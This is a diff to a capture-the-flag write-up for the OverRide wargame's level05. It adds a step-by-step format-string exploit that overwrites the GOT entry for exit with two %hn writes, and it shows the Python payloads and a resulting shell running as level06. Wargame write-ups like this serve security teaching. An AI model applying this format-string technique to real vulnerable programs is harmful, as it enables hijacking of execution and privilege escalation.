@@ -51,15 +51,34 @@ $1 = 0xffffdd10 "\220\220\220\220\220\220\220\220\220\220\220\220...
 Let's add a good `0x64` just to be safe -> `0xFFFFDD74`
 GOT exit -> `0x80497e0`
 ```shell
-(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "%{}10$p".format(str(0xFFFFDD74))')
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-
-Starting program: /home/users/level05/level05 < <(python -c 'print "\xe0\x97\x04\x08" + "%{}10$p".format(str(0xFFFFDD74))')
-[Inferior 1 (process 32014) exited normally]
-```
-
-TODO
-```
 level05@OverRide:~$ ./level05   < <(python -c 'print "\xe0\x97\x04\x08" + "%{}$p".format(str(0xffffdd74)) + "%10$n"')
 ```
+It doesn't work this time, the reason is that we just can't use such a big number of characters for padding. We'll have to split our writes between the higher and lower bytes, and use the modifier `h` to only write 2 bytes, like this:
+```shell
+level05@OverRide:~$ ./level05 < <(echo "AAAABBBB%10\$p%11\$p")
+aaaabbbbb0x616161610x62626262
+```
+
+Which translates to:
+`(GOT ADDR LO BYTES ADDR | GOT ADDR HI BYTES ADDR ) ` +
+`(( % PADDING | LO BYTES OF PWN ADDR - 8 | THROWAWAY CONV) | ( % SRC | 10TH VALUE IN STACK | $hn WRITE 2 BYTES))`
+`(( % PADDING | HI BYTES OF PWN ADDR - LO BYTES | THROAWAY CONV) | (% SRC | 11TH VAL IN STACK | $hn WRITE 2 BYTES))`
+
+Which should give us before conversions
+`(0x80497E0 + 0x80497E2) + ( %(0xDD74-8)$x + %10$hn ) + ( %(0xFFFF-DD74)$x  + %11$hn)`
+
+in python:
+```python
+"\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%{}c".format(0xdd74-8) + "%10$hn" + "%{}c".format(0xffff-0xdd74) + "%11$hn"
+```
+
+Let's try it
+```shell
+level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%{}c".format(0xdd74-8) + "%10$hn" + "%{}c".format(0xffff-0xdd74) + "%11$hn"' ; cat ) | ./level05 
+
+[...]
+whoami
+level06
+```
+
+What a handful!
